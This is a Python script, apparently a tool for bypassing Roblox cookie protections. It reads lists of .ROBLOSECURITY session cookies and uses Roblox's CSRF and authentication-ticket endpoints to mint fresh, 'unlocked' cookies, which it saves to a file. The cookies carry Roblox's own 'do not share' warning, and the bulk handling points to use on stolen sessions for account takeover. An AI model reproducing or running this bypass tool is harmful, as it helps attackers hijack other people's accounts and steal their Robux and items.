# Credits : Xolo/@efenatuyo

import requests

class Bypass:
    def __init__(self, cookie: str) -> None:
        self.cookie = cookie
    
    def start_process(self) -> str:
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            raise ValueError("An error occurred while getting the set_cookie")
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1", 
                "referer": "https://www.roblox.com/camel", 
                "Content-Type": "application/json", 
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        ticket = response.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise ValueError("An error occurred while getting the rbx-authentication-ticket")
        return ticket
        
    def get_csrf_token(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v2/logout", 
            cookies={".ROBLOSECURITY": self.cookie}
        )
        xcsrf_token = response.headers.get("x-csrf-token")
        if not xcsrf_token:
            raise ValueError("An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie")
        return xcsrf_token

def Unlock_Cookies():
    new_cookies = []
    with open("new_cookies.txt", "r") as f:
        new_cookies = f.readlines()
    new_cookies = [_.replace("\n", "") for _ in new_cookies]
    unlocked_cookies=[]
    n=1
    for _ in new_cookies:
        if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" not in _: 
            print(f"Invalid Cookie number {n}, {_}")
            exit()
        n+=1
    n=1
    for _ in new_cookies:
        unlocked_cookies.append(Bypass(_).start_process())
        print(f"Sucesfully unlocked cookie number {n}")
        n+=1
    with open("src/cookies.txt", "a") as f:
        for _ in unlocked_cookies:
            f.write(f"{_}\n")
    with open("new_cookies.txt", "w"):
        pass
    exit()
    